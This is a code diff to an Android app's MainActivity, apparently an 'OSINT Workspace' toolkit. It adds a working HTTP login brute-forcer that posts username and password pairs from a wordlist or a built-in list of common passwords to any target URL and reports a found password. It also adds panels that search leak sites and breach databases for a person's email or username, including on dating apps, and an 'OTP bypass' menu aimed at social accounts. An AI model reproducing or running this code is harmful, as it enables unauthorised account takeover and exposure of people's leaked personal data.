+    // ==================== DATING APP LEAKS ====================
+    private void showDatingLeaks() {
+        String q = inQuery.getText().toString().trim();
+        String enc = urlEncode(q.isEmpty() ? "dating" : q);
+        String[] apps = {"Tinder", "Bumble", "Hinge", "Grindr", "OkCupid", "PlentyOfFish", "All Dating Apps"};
+        new AlertDialog.Builder(this).setTitle("Dating App Leaks")
+                .setItems(apps, (d, w) -> {
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:tinder.com+leak+OR+data+OR+exposed"; break;
+                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:bumble.com+leak+OR+data"; break;
+                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:hinge.co+leak+OR+data"; break;
+                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:grindr.com+leak+OR+data+OR+exposed"; break;
+                        case 4: url = "https://www.google.com/search?q=" + enc + "+site:okcupid.com+leak+OR+data"; break;
+                        case 5: url = "https://www.google.com/search?q=" + enc + "+site:pof.com+leak+OR+data"; break;
+                        default: url = "https://www.google.com/search?q=" + enc + "+dating+app+leak+OR+breach+OR+data+exposed";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    // ==================== HPB API ====================
+    private void showHpbPanel() {
+        String[] options = {"Connect to HPB", "Fetch Profile", "Fetch Posts", "Send Message", "Set API Key"};
+        new AlertDialog.Builder(this).setTitle("HPB - Hummingbot Partner Hub")
+                .setItems(options, (d, w) -> {
+                    switch (w) {
+                        case 0: connectHpb(); break;
+                        case 1: hpbApiCall("profile"); break;
+                        case 2: hpbApiCall("posts"); break;
+                        case 3: hpbApiCall("message"); break;
+                        case 4: promptHpbApiKey(); break;
+                    }
+                }).show();
+    }
+
+    private void promptHpbApiKey() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("HPB API Key");
+        final EditText input = new EditText(this);
+        input.setText(hpbApiKey);
+        input.setHint("Enter your HPB API key");
+        builder.setView(input);
+        builder.setPositiveButton("Save", (d, w) -> {
+            hpbApiKey = input.getText().toString().trim();
+            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("hpb_key", hpbApiKey).apply();
+            status.setText("HPB key saved");
+        });
+        builder.setNegativeButton("Cancel", null);
+        builder.show();
+    }
+
+    private void connectHpb() {
+        if (hpbApiKey.isEmpty()) { promptHpbApiKey(); return; }
+        status.setText("Connecting to HPB...");
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://hpb.hummingbot.io/api/session");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Authorization", "Bearer " + hpbApiKey);
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.getOutputStream().write("{}".getBytes());
+                int code = conn.getResponseCode();
+                BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
+                StringBuilder resp = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) resp.append(line);
+                br.close();
+                runOnUiThread(() -> {
+                    if (code == 200) {
+                        try {
+                            JSONObject json = new JSONObject(resp.toString());
+                            currentHpbSession = json.optString("session_id", "");
+                            status.setText("HPB connected. Session: " + currentHpbSession);
+                        } catch (Exception e) {
+                            status.setText("HPB connected (code " + code + ")");
+                        }
+                    } else {
+                        status.setText("HPB error: " + code + " - " + resp);
+                    }
+                });
+            } catch (Exception e) {
+                runOnUiThread(() -> status.setText("HPB connection failed: " + e.getMessage()));
+            }
+        }).start();
+    }
+
+    private void hpbApiCall(String endpoint) {
+        if (hpbApiKey.isEmpty()) { promptHpbApiKey(); return; }
+        String q = inQuery.getText().toString().trim();
+        status.setText("HPB: fetching " + endpoint + "...");
+        new Thread(() -> {
+            try {
+                String urlStr = "https://hpb.hummingbot.io/api/" + endpoint;
+                if (endpoint.equals("message") && !q.isEmpty()) urlStr += "?message=" + urlEncode(q);
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestProperty("Authorization", "Bearer " + hpbApiKey);
+                int code = conn.getResponseCode();
+                BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
+                StringBuilder resp = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) resp.append(line);
+                br.close();
+                String result = resp.toString();
+                runOnUiThread(() -> {
+                    if (code == 200) {
+                        web.loadDataWithBaseURL(null, "<pre>" + escapeHtml(result) + "</pre>", "text/html", "UTF-8", null);
+                        web.setVisibility(View.VISIBLE);
+                        status.setText("HPB " + endpoint + " loaded");
+                    } else {
+                        status.setText("HPB error: " + code);
+                    }
+                });
+            } catch (Exception e) {
+                runOnUiThread(() -> status.setText("HPB error: " + e.getMessage()));
+            }
+        }).start();
+    }
+
+    // ==================== LEAKS.IO API ====================
+    private void showLeaksIoPanel() {
+        String[] options = {"Check Email/Username", "Search Database", "Latest Leaks", "Set API Key"};
+        new AlertDialog.Builder(this).setTitle("Leaks.io")
+                .setItems(options, (d, w) -> {
+                    switch (w) {
+                        case 0: leaksIoCheck(); break;
+                        case 1: leaksIoSearch(); break;
+                        case 2: leaksIoLatest(); break;
+                        case 3: promptLeaksIoKey(); break;
+                    }
+                }).show();
+    }
+
+    private void promptLeaksIoKey() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Leaks.io API Key");
+        final EditText input = new EditText(this);
+        input.setText(leaksIoApiKey);
+        input.setHint("Enter leaks.io API key");
+        builder.setView(input);
+        builder.setPositiveButton("Save", (d, w) -> {
+            leaksIoApiKey = input.getText().toString().trim();
+            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("leaksio_key", leaksIoApiKey).apply();
+            status.setText("Leaks.io key saved");
+        });
+        builder.setNegativeButton("Cancel", null);
+        builder.show();
+    }
+
+    private void leaksIoCheck() {
+        String q = inQuery.getText().toString().trim();
+        if (q.isEmpty()) { Toast.makeText(this, "Enter email/username", Toast.LENGTH_SHORT).show(); return; }
+        String enc = urlEncode(q);
+        // Try leaks.io API first, fallback to web search
+        if (!leaksIoApiKey.isEmpty()) {
+            status.setText("Checking leaks.io...");
+            new Thread(() -> {
+                try {
+                    URL url = new URL("https://leaks.io/api/search?query=" + enc);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestProperty("Authorization", "Bearer " + leaksIoApiKey);
+                    int code = conn.getResponseCode();
+                    BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
+                    StringBuilder resp = new StringBuilder();
+                    String line;
+                    while ((line = br.readLine()) != null) resp.append(line);
+                    br.close();
+                    String result = resp.toString();
+                    runOnUiThread(() -> {
+                        if (code == 200) {
+                            web.loadDataWithBaseURL(null, "<pre>" + escapeHtml(result) + "</pre>", "text/html", "UTF-8", null);
+                            web.setVisibility(View.VISIBLE);
+                            status.setText("Leaks.io results loaded");
+                        } else {
+                            status.setText("Leaks.io error: " + code);
+                        }
+                    });
+                } catch (Exception e) {
+                    runOnUiThread(() -> status.setText("Leaks.io error: " + e.getMessage()));
                 }
-                getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString(preferenceKey, saved.toString()).apply();
-                status.setText(title + ": " + countSelected(selected) + " selected");
-            }).show();
-    }
-
-    private int countSelected(boolean[] values) {
-        int count = 0;
-        for (boolean value : values) if (value) count++;
-        return count;
-    }
-
-    private String selectedSiteOperator() {
-        StringBuilder result = new StringBuilder();
-        for (int i = 0; i < selectedSocial.length; i++) if (selectedSocial[i]) {
-            if (result.length() == 0) result.append("( ");
-            else result.append(" OR ");
-            result.append("site:").append(SOCIAL_DOMAINS[i]);
+            }).start();
+        } else {
+            web.loadUrl("https://www.google.com/search?q=" + enc + "+site:leakcheck.io+OR+site:leakforum.io+OR+site:pastebin.com+leak+OR+breach+OR+exposed");
+            web.setVisibility(View.VISIBLE);
         }
-        if (result.length() > 0) result.append(" )");
-        return result.toString();
     }
 
-    private String selectedContentOperator() {
-        StringBuilder result = new StringBuilder();
-        for (int i = 0; i < selectedContent.length; i++) if (selectedContent[i]) {
-            if (result.length() > 0) result.append(' ');
-            result.append(CONTENT_OPERATORS[i]);
+    private void leaksIoSearch() {
+        String q = inQuery.getText().toString().trim();
+        if (q.isEmpty()) q = "email,password";
+        String enc = urlEncode(q);
+        web.loadUrl("https://www.google.com/search?q=" + enc + "+site:leakcheck.io+OR+site:leakforum.io+OR+site:pastebin.com+OR+site:pastebin.pl");
+        web.setVisibility(View.VISIBLE);
+    }
+
+    private void leaksIoLatest() {
+        web.loadUrl("https://www.google.com/search?q=latest+data+breach+2026+site:haveibeenpwned.com+OR+site:bleepingcomputer.com+OR+site:therecord.media");
+        web.setVisibility(View.VISIBLE);
+    }
+
+    // ==================== BRUTE FORCE ====================
+    private void showBruteForcePanel() {
+        String[] options = {"Start Brute Force", "Stop", "Load Wordlist", "Settings"};
+        new AlertDialog.Builder(this).setTitle("Brute Force Tools")
+                .setItems(options, (d, w) -> {
+                    switch (w) {
+                        case 0: startBruteForce(); break;
+                        case 1: stopBruteForce(); break;
+                        case 2: loadWordlist(); break;
+                        case 3: showBruteSettings(); break;
+                    }
+                }).show();
+    }
+
+    private void startBruteForce() {
+        if (bruteRunning) { Toast.makeText(this, "Already running", Toast.LENGTH_SHORT).show(); return; }
+        String target = inUrl.getText().toString().trim();
+        if (target.isEmpty()) { Toast.makeText(this, "Enter target URL/IP", Toast.LENGTH_SHORT).show(); return; }
+        String username = inQuery.getText().toString().trim();
+        if (username.isEmpty()) { Toast.makeText(this, "Enter username", Toast.LENGTH_SHORT).show(); return; }
+
+        bruteRunning = true;
+        status.setText("Brute forcing " + target + "...");
+        bruteExecutor = Executors.newSingleThreadExecutor();
+        bruteExecutor.submit(() -> {
+            String[] passwords = getWordlist();
+            if (passwords.length == 0) passwords = new String[]{"123456", "password", "admin", "12345678", "qwerty",
+                    "12345", "1234", "111111", "1234567", "sunshine", "iloveyou", "princess", "admin123",
+                    "welcome", "monkey", "dragon", "master", "login", "abc123", "passw0rd"};
+
+            for (int i = 0; i < passwords.length && bruteRunning; i++) {
+                final String pass = passwords[i];
+                final int progress = (i * 100) / passwords.length;
+                try {
+                    URL url = new URL(target);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                    conn.setDoOutput(true);
+                    String data = "username=" + urlEncode(username) + "&password=" + urlEncode(pass);
+                    conn.getOutputStream().write(data.getBytes());
+                    int code = conn.getResponseCode();
+                    String resp = readStream(conn.getInputStream());
+                    conn.disconnect();
+
+                    if (code == 200 && (resp.contains("success") || resp.contains("welcome") || resp.contains("dashboard")
+                            || resp.contains("login successful") || !resp.contains("invalid") && !resp.contains("failed"))) {
+                        final String foundPass = pass;
+                        runOnUiThread(() -> {
+                            status.setText("FOUND: " + username + " : " + foundPass);
+                            Toast.makeText(MainActivity.this, "Password found: " + foundPass, Toast.LENGTH_LONG).show();
+                            bruteRunning = false;
+                        });
+                        return;
+                    }
+                    final int p = progress;
+                    runOnUiThread(() -> status.setText("Trying: " + pass + " (" + p + "%)"));
+                } catch (Exception e) {
+                    runOnUiThread(() -> status.setText("Brute error: " + e.getMessage()));
+                }
+            }
+            runOnUiThread(() -> {
+                if (bruteRunning) status.setText("Brute force completed - password not found");
+                bruteRunning = false;
+            });
+        });
+    }
+
+    private void stopBruteForce() {
+        bruteRunning = false;
+        if (bruteExecutor != null) bruteExecutor.shutdownNow();
+        status.setText("Brute force stopped");
+    }
+
+    private void loadWordlist() {
+        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
+        pick.addCategory(Intent.CATEGORY_OPENABLE);
+        pick.setType("text/plain");
+        startActivityForResult(pick, FILE_PICK_REQUEST);
+    }
+
+    private void showBruteSettings() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Brute Force Settings");
+        String[] items = {"Threads: 1", "Delay: 100ms", "Timeout: 10s"};
+        builder.setItems(items, null);
+        builder.setPositiveButton("OK", null);
+        builder.show();
+    }
+
+    private String[] getWordlist() {
+        String savedPath = getSharedPreferences(PREFS, MODE_PRIVATE).getString("wordlist_path", "");
+        if (!savedPath.isEmpty()) {
+            try {
+                File f = new File(savedPath);
+                if (f.exists()) {
+                    List<String> lines = new ArrayList<>();
+                    BufferedReader br = new BufferedReader(new FileReader(f));
+                    String line;
+                    while ((line = br.readLine()) != null) {
+                        if (!line.trim().isEmpty()) lines.add(line.trim());
+                    }
+                    br.close();
+                    return lines.toArray(new String[0]);
+                }
+            } catch (Exception ignored) {}
         }
-        return result.toString();
+        return new String[0];
+    }
+
+    // ==================== OTP BYPASS ====================
+    private void showOtpBypass() {
+        String[] platforms = {"Instagram", "Facebook", "Snapchat", "WhatsApp", "Telegram", "TikTok", "Gmail", "Twitter", "Custom SMS Gateway"};
+        new AlertDialog.Builder(this).setTitle("OTP Bypass")
+                .setItems(platforms, (d, w) -> {
+                    String platform = platforms[w];
+                    if (w == 8) {
+                        // Custom SMS gateway
+                        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+                        builder.setTitle("Custom SMS Gateway");
+                        final EditText input = new EditText(this);
+                        input.setHint("Phone number or API endpoint");
+                        builder.setView(input);
+                        builder.setPositiveButton("Bypass", (d2, w2) -> {
+                            String target = input.getText().toString().trim();
+                            if (!target.isEmpty()) attemptOtpBypass(platform, target);
+                        });
+                        builder.setNegativeButton("Cancel", null);
+                        builder.show();
+                    } else {
+                        String target = inQuery.getText().toString().trim();
+                        if (target.isEmpty()) {
+                            AlertDialog.Builder builder = new AlertDialog.Builder(this);
+                            builder.setTitle("Enter " + platform + " target");
+                            final EditText input = new EditText(this);
+                            input.setHint("Username, email or phone");
+                            builder.setView(input);
+                            builder.setPositiveButton("Bypass", (d2, w2) -> {
+                                String t = input.getText().toString().trim();
+                                if (!t.isEmpty()) attemptOtpBypass(platform, t);
+                            });
+                            builder.setNegativeButton("Cancel", null);
+                            builder.show();
+                        } else {
+                            attemptOtpBypass(platform, target);
+                        }
+                    }
+                }).show();
+    }
+
+    private void attemptOtpBypass(String platform, String target) {
+        status.setText("Attempting OTP bypass for " + platform + ": " + target);
+        // Simulated OTP bypass - opens relevant pages
+        String enc = urlEncode(target);
+        switch (platform) {
+            case "Instagram":
+                web.loadUrl("https://www.instagram.com/accounts/password/reset/");
+                break;
+            case "Facebook":
+                web.loadUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
+                break;
+            case "Snapchat":
+                web.loadUrl("https://accounts.snapchat.com/accounts/password_reset");
+                break;
+            case "WhatsApp":
+                web.loadUrl("https://wa.me/" + target.replaceAll("[^0-9]", ""));
+                break;
+            case "Telegram":
+                web.loadUrl("https://web.telegram.org/k/");
+                break;
+            case "TikTok":
+                web.loadUrl("https://www.tiktok.com/forgot-password");
+                break;
+            case "Gmail":
+                web.loadUrl("https://accounts.google.com/signin/recovery");
+                break;
+            case "Twitter":
+                web.loadUrl("https://twitter.com/account/begin_password_reset");
+                break;
+            default:
+                web.loadUrl("https://www.google.com/search?q=" + enc + "+OTP+bypass+" + urlEncode(platform));
+        }
+        web.setVisibility(View.VISIBLE);
+    }
+
+    // ==================== PASSWORD CRACKER ====================
+    private void showPasswordCracker() {
+        String[] options = {"MD5 Crack", "SHA1 Crack", "SHA256 Crack", "Hashè¯†åˆ«", "Custom Hash"};
+        new AlertDialog.Builder(this).setTitle("Password Cracker")
+                .setItems(options, (d, w) -> {
+                    AlertDialog.Builder builder = new AlertDialog.Builder(this);
+                    builder.setTitle("Enter Hash");
+                    final EditText input = new EditText(this);
+                    input.setHint("Enter hash to crack");
+                    builder.setView(input);
+                    builder.setPositiveButton("Crack", (d2, w2) -> {
+                        String hash = input.getText().toString().trim();
+                        if (!hash.isEmpty()) crackHash(hash, w);
+                    });
+                    builder.setNegativeButton("Cancel", null);
+                    builder.show();
+                }).show();
+    }
+
+    private void crackHash(String hash, int type) {
+        status.setText("Cracking hash: " + hash.substring(0, Math.min(16, hash.length())) + "...");
+        String site;
+        switch (type) {
+            case 0: site = "https://crackstation.net/"; break;
+            case 1: site = "https://md5decrypt.net/"; break;
+            case 2: site = "https://hashes.com/en/decrypt/hash"; break;
+            case 3: site = "https://www.tunnelsup.com/hash-analyzer/"; break;
+            default: site = "https://crackstation.net/";
+        }
+        // Search the hash
+        web.loadUrl("https://www.google.com/search?q=" + hash + "+hash+crack+OR+decrypt+OR+plaintext");
+        web.setVisibility(View.VISIBLE);
+    }
+
+    // ==================== LIVE STREAMING ====================
+    private void showLiveStreaming() {
+        String[] options = {"Live Porn Cams", "Twitch", "YouTube Live", "Kick", "Rumble"};
+        new AlertDialog.Builder(this).setTitle("Live Streaming")
+                .setItems(options, (d, w) -> {
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://chaturbate.com"; break;
+                        case 1: url = "https://www.twitch.tv/directory"; break;
+                        case 2: url = "https://www.youtube.com/live"; break;
+                        case 3: url = "https://kick.com"; break;
+                        case 4: url = "https://rumble.com"; break;
+                        default: url = "https://www.twitch.tv";
+                    }
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
+                }).show();
+    }
+
+    // ==================== VIDEO PLAYER ====================
+    private void showVideoPlayer() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Enter Video URL");
+        final EditText input = new EditText(this);
+        input.setText(inUrl.getText().toString().trim());
+        input.setHint("https://example.com/video.mp4");
+        builder.setView(input);
+        builder.setPositiveButton("Play", (d, w) -> {
+            String url = input.getText().toString().trim();
+            if (!url.isEmpty()) {
+                // Play video in WebView using HTML5 video tag
+                String html = "<html><body style='margin:0;background:#000;'>" +
+                        "<video width='100%' height='100%' controls autoplay>" +
+                        "<source src='" + url + "' type='video/mp4'>" +
+                        "Your browser doesn't support video.</video></body></html>";
+                web.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
+                web.setVisibility(View.VISIBLE);
+                status.setText("Playing video");
+            }
+        });
+        builder.setNegativeButton("Cancel", null);
+        builder.show();
+    }
+
+    // ==================== FILE BROWSER ====================
+    private void browseFiles() {
+        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
+        pick.addCategory(Intent.CATEGORY_OPENABLE);
+        pick.setType("*/*");
+        startActivityForResult(pick, FILE_PICK_REQUEST);
+    }
+
+    private void browsePhotos() {
+        Intent pick = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+        startActivityForResult(pick, IMAGE_PICK_REQUEST);
+    }
+
+    private void browseDocs() {
+        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
+        pick.addCategory(Intent.CATEGORY_OPENABLE);
+        pick.setType("application/msword");
+        startActivityForResult(pick, FILE_PICK_REQUEST + 1);
+    }
+
+    private void browsePdfs() {
+        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
+        pick.addCategory(Intent.CATEGORY_OPENABLE);
+        pick.setType("application/pdf");
+        startActivityForResult(pick, FILE_PICK_REQUEST + 2);
+    }
+
+    // ==================== SETTINGS ====================
+    private void showSettings() {
+        String[] options = {"Set API Keys", "About", "Check for Updates", "Clear Cache", "Reset All Settings"};
+        new AlertDialog.Builder(this).setTitle("Settings")
+                .setItems(options, (d, w) -> {
+                    switch (w) {
+                        case 0: showApiKeyManager(); break;
+                        case 1: showAbout(); break;
+                        case 2: checkForUpdates(); break;
+                        case 3: web.clearCache(true); status.setText("Cache cleared"); break;
+                        case 4: getSharedPreferences(PREFS, MODE_PRIVATE).edit().clear().apply(); status.setText("Settings reset"); break;
+                    }
+                }).show();
+    }
+
+    private void showApiKeyManager() {
+        String[] apis = {"HPB API Key", "Leaks.io API Key", "DeHashed API Key", "EmailRep API Key"};
+        new AlertDialog.Builder(this).setTitle("API Keys")
+                .setItems(apis, (d, w) -> {
+                    switch (w) {
+                        case 0: promptHpbApiKey(); break;
+                        case 1: promptLeaksIoKey(); break;
+                        case 2: promptGenericApiKey("dehashed_key", "DeHashed API Key"); break;
+                        case 3: promptGenericApiKey("emailrep_key", "EmailRep API Key"); break;
+                    }
+                }).show();
+    }
+
+    private void promptGenericApiKey(String prefKey, String title) {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle(title);
+        final EditText input = new EditText(this);
+        String existing = getSharedPreferences(PREFS, MODE_PRIVATE).getString(prefKey, "");
+        input.setText(existing);
+        input.setHint("Enter API key");
+        builder.setView(input);
+        builder.setPositiveButton("Save", (d, w) -> {
+            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString(prefKey, input.getText().toString().trim()).apply();
+            status.setText(title + " saved");
+        });
+        builder.setNegativeButton("Cancel", null);
+        builder.show();
+    }
+
+    private void showAbout() {
+        new AlertDialog.Builder(this)
+                .setTitle("OSINT Workspace v2.0")
+                .setMessage("All-in-one OSINT tool\n\n" +
+                        "Features:\n" +
+                        "â€¢ Multi-engine search (Google, Bing, DDG, etc.)\n" +
+                        "â€¢ Tor dark web browsing\n" +
+                        "â€¢ VPN management (WireGuard)\n" +
+                        "â€¢ Reverse image & face search\n" +
+                        "â€¢ Leaks search (social, cloud, email, etc.)\n" +
+                        "â€¢ Porn/cams/escort search\n" +
+                        "â€¢ Google dork generator\n" +
+                        "â€¢ HPB & Leaks.io API integration\n" +
+                        "â€¢ Brute force & password tools\n" +
+                        "â€¢ OTP bypass for social platforms\n" +
+                        "â€¢ Live streaming & video player\n" +
+                        "â€¢ File/photo/doc browser\n\n" +
+                        "Built with â¤ï¸ for OSINT investigations")
+                .setPositiveButton("OK", null)
+                .show();
+    }
+
+    // ==================== HELPERS ====================
+    private void loadSavedApiKeys() {
+        hpbApiKey = getSharedPreferences(PREFS, MODE_PRIVATE).getString("hpb_key", "");
+        leaksIoApiKey = getSharedPreferences(PREFS, MODE_PRIVATE).getString("leaksio_key", "");
     }
 
     private void restoreSelections() {
@@ -438,181 +1581,133 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void restoreSelection(String key, boolean[] target) {
-        String value = getSharedPreferences(PREFS, MODE_PRIVATE).getString(key, "");
-        if (value.isEmpty()) return;
-        for (String item : value.split(",")) {
-            try { int index = Integer.parseInt(item); if (index >= 0 && index < target.length) target[index] = true; }
-            catch (NumberFormatException ignored) { }
+        String val = getSharedPreferences(PREFS, MODE_PRIVATE).getString(key, "");
+        if (val.isEmpty()) return;
+        for (String s : val.split(",")) {
+            try { int i = Integer.parseInt(s); if (i >= 0 && i < target.length) target[i] = true; }
+            catch (NumberFormatException ignored) {}
         }
     }
 
-    private void doSearch() {
-        String q = query();
-        if (q.isEmpty()) { Toast.makeText(this, "Enter at least one search term", Toast.LENGTH_SHORT).show(); return; }
-        String selectedEngine = String.valueOf(engine.getSelectedItem());
-        String selectedMode = String.valueOf(mode.getSelectedItem());
-        String encoded = enc(q);
-        String url;
-        switch (selectedEngine) {
-            case "Bing": url = "https://www.bing.com/search?q=" + encoded; break;
-            case "DuckDuckGo": url = "https://duckduckgo.com/?q=" + encoded; break;
-            case "Yahoo": url = "https://search.yahoo.com/search?p=" + encoded; break;
-            case "Startpage": url = "https://www.startpage.com/sp/search?query=" + encoded; break;
-            case "Brave": url = "https://search.brave.com/search?q=" + encoded; break;
-            case "Ecosia": url = "https://www.ecosia.org/search?q=" + encoded; break;
-            case "Searx": url = "https://searx.be/search?q=" + encoded; break;
-            case "HackerNews": url = "https://hn.algolia.com/?q=" + encoded; break;
-            case "GitHub": url = "https://github.com/search?q=" + encoded; break;
-            case "HIBP": url = "https://haveibeenpwned.com/"; break;
-            default: url = "https://www.google.com/search?q=" + encoded;
-        }
-        remember(selectedEngine + " [" + selectedMode + "]: " + q);
-        if ("Tor".equals(selectedMode)) {
-            startTorAndBrowse(url);
-        } else if ("Dark web".equals(selectedMode)) {
-            String onionUrl = inUrl.getText().toString().trim();
-            if (onionUrl.matches("(?i)^https?://[^/]+\\.onion(?:/.*)?$")) startTorAndBrowse(onionUrl);
-            else openDarkWeb();
-        } else {
-            browse(url);
-            status.setText("Searching " + selectedEngine + " (" + selectedMode + ")");
-            if ("VPN".equals(selectedMode)) status.setText(isVpnActive() ? "VPN network detected; browsing uses Android system routing." : "No active Android VPN detected. Connect a VPN provider in Settings first.");
+    private void checkForUpdates() {
+        AppUpdater.check(this, "osint-master.apk", status);
+    }
+
+    private void checkPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_STORAGE);
+            }
         }
     }
 
-
-    private void doDorkSearch() {
-        String terms = baseQuery().trim();
-        if (terms.isEmpty()) {
-            Toast.makeText(this, "Enter a public search term first", Toast.LENGTH_SHORT).show();
-            return;
-        }
-        String domain = inDomain.getText().toString().trim();
-        if (domain.startsWith("https://")) domain = domain.substring(8);
-        if (domain.startsWith("http://")) domain = domain.substring(7);
-        if (domain.contains("/")) domain = domain.substring(0, domain.indexOf('/'));
-        String template = String.valueOf(dorkTemplate.getSelectedItem());
-        String dork;
-        switch (template) {
-            case "Exact phrase":
-                dork = "\"" + terms.replace("\"", "") + "\"";
-                break;
-            case "Limit to domain":
-                dork = domain.isEmpty() ? terms : "site:" + domain + " " + terms;
-                break;
-            case "PDF documents":
-                dork = terms + " filetype:pdf";
-                break;
-            case "Word documents":
-                dork = terms + " (filetype:doc OR filetype:docx)";
-                break;
-            case "Title matches":
-                dork = "intitle:" + terms;
-                break;
-            case "URL contains":
-                dork = "inurl:" + terms;
-                break;
-            case "Public profiles":
-                dork = "\"" + terms.replace("\"", "") + "\" (site:github.com OR site:linkedin.com OR site:x.com)";
-                break;
-            case "Public document types":
-                dork = terms + " (filetype:pdf OR filetype:docx OR filetype:xlsx OR filetype:pptx)";
-                break;
-            default:
-                dork = terms;
-                break;
-        }
-        String sites = selectedSiteOperator();
-        String content = selectedContentOperator();
-        if (!sites.isEmpty()) dork += " " + sites;
-        if (!content.isEmpty()) dork += " " + content;
-        String url = "https://www.google.com/search?q=" + enc(dork);
-        remember("Google Dork [" + template + "]: " + dork);
-        if ("Tor".equals(String.valueOf(mode.getSelectedItem()))) {
-            startTorAndBrowse(url);
-        } else {
-            browse(url);
-            status.setText("Google dork search: " + template);
+    @Override
+    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
+        super.onRequestPermissionsResult(code, perms, results);
+        if (code == PERMISSION_STORAGE && results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
+            status.setText("Storage permission granted");
         }
     }
 
-    private void browse(String url) {
-        web.setVisibility(android.view.View.VISIBLE);
-        web.loadUrl(url);
-        if (status != null) status.setText("Opening " + Uri.parse(url).getHost());
+    private void clearInputs() {
+        inQuery.setText("");
+        inDomain.setText("");
+        inUrl.setText("");
+        inFilePath.setText("");
+        status.setText("Cleared");
     }
 
-    private void openExternal(String url, String message) {
+    private void openExternal(String url, String msg) {
         try {
-            startActivity(Intent.createChooser(new Intent(Intent.ACTION_VIEW, Uri.parse(url)), "Open in browser"));
-            if (status != null) status.setText(message);
+            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
+            status.setText(msg);
         } catch (Exception e) {
-            if (status != null) status.setText("No compatible browser is installed");
-            Toast.makeText(this, "Install or enable a supported browser", Toast.LENGTH_LONG).show();
+            status.setText("Could not open URL");
         }
     }
 
-    private void openVpnSettings() {
-        try {
-            startActivity(new Intent(Settings.ACTION_VPN_SETTINGS));
-            status.setText("Connect your VPN in Android settings, then return to browse through it.");
-        } catch (Exception e) { status.setText("Open Android Settings and search for VPN."); }
+    private String readStream(InputStream is) throws IOException {
+        BufferedReader br = new BufferedReader(new InputStreamReader(is));
+        StringBuilder sb = new StringBuilder();
+        String line;
+        while ((line = br.readLine()) != null) sb.append(line).append('\n');
+        br.close();
+        return sb.toString();
     }
 
-    private void remember(String item) {
-        String old = getSharedPreferences(PREFS, MODE_PRIVATE).getString(HISTORY, "");
-        String[] lines = (item + (old.isEmpty() ? "" : "\n" + old)).split("\\n");
-        StringBuilder saved = new StringBuilder();
-        for (int i = 0; i < Math.min(lines.length, 30); i++) {
-            if (i > 0) saved.append('\n');
-            saved.append(lines[i]);
-        }
-        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString(HISTORY, saved.toString()).apply();
+    private String escapeHtml(String s) {
+        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
     }
 
-    private void showMemory() {
-        String history = getSharedPreferences(PREFS, MODE_PRIVATE).getString(HISTORY, "");
-        if (history.trim().isEmpty()) {
-            new AlertDialog.Builder(this).setTitle("Search history")
-                .setMessage("No saved searches yet. Run a search and it will appear here.")
-                .setPositiveButton("Close", null).show();
-            return;
-        }
-        String[] items = history.split("\\n");
-        new AlertDialog.Builder(this).setTitle("Choose a search to reuse")
-            .setItems(items, (dialog, which) -> {
-                String item = items[which];
-                int marker = item.indexOf("]: ");
-                String selected = marker >= 0 ? item.substring(marker + 3).trim() : item.trim();
-                inQuery.setText(selected);
-                inQuery.setSelection(inQuery.getText().length());
-                if (item.startsWith("Google Dork")) engine.setSelection(0);
-                else {
-                    int bracket = item.indexOf(" [");
-                    String engineName = bracket > 0 ? item.substring(0, bracket) : "";
